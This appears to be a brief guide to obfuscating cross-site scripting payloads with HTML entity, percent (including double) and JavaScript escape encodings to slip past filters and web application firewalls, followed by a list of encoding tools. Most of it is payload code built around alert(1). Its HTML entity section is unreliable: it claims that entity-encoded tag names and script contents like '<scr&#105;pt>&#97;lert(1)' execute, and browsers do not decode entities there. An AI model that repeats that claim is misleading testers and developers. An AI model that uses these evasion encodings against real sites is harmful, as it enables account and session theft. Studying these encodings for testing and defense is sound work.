XSS Payload Encodings Guide

Techniques to obfuscate malicious JavaScript payloads, bypassing filters and WAFs. Understanding these methods is key for both defense and offense.

& HTML Entity Encoding

Uses numerical (decimal or hexadecimal) representations of characters. This is often effective in `<script>` tags when HTML parsers decode entities before the JavaScript engine executes the code.

// Original Payload (Alert)

<script>alert(1)</script>

// Encoded Version (Decimal)

<scr&#105;pt>&#97;lert(1)</scr&#105;pt>

// Encoded Version (Hexadecimal)

<scr&#x69;pt>&#x61;lert(1)</scr&#x69;pt>

% URL Encoding (Percent)

Replaces unsafe ASCII characters with a '%' followed by the two-digit hexadecimal value. This is typically used in the URL bar, but can also be relevant when data is reflected in a context that requires URL decoding first (e.g., within `href` attributes).

// Original Payload (Alert)

alert(1)

// Encoded Version (Basic)

%61%6C%65%72%74%28%31%29

// Double Encoded (useful for testing WAF bypasses)

%2561%256C%2565%2572%2574%2528%2531%2529

\ JavaScript String Escapes

JavaScript allows characters inside strings to be represented using octal (`\xxx`), hexadecimal (`\x`), or Unicode (`\u`) escape sequences. This is often used when the payload is injected *inside* an existing JavaScript block.

// Example: `var x = "PAYLOAD";`

// Encoded using Hex (`\x`) - Target: `alert(1)`

\x61\x6c\x65\x72\x74\x28\x31\x29

// Encoded using Unicode (`\u`) - Target: `alert(1)`

\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029

// Encoded using Octal - Target: `alert(1)`

\141\154\145\162\164\050\061\051

Useful Encoding Tools

Leverage these powerful, open-source tools to quickly encode and decode payloads for testing and analysis:

  • CyberChef (GCHQ): A "Swiss Army Knife" for web cryptography and encoding, featuring a massive library of operations.
  • Burp Suite Decoder: Integrated into the Burp Suite framework, essential for manually encoding/decoding data for proxy testing.
  • Online URL Encoder/Decoder: Simple web-based utility for quick URL (percent) and base64 encoding/decoding operations.

Important Note on Decoders

Effective XSS requires understanding which context (HTML, URL, JavaScript) the payload is being reflected into, and how many times the browser or server will decode the input before interpretation. Often, double or triple encoding is necessary to bypass certain security controls.
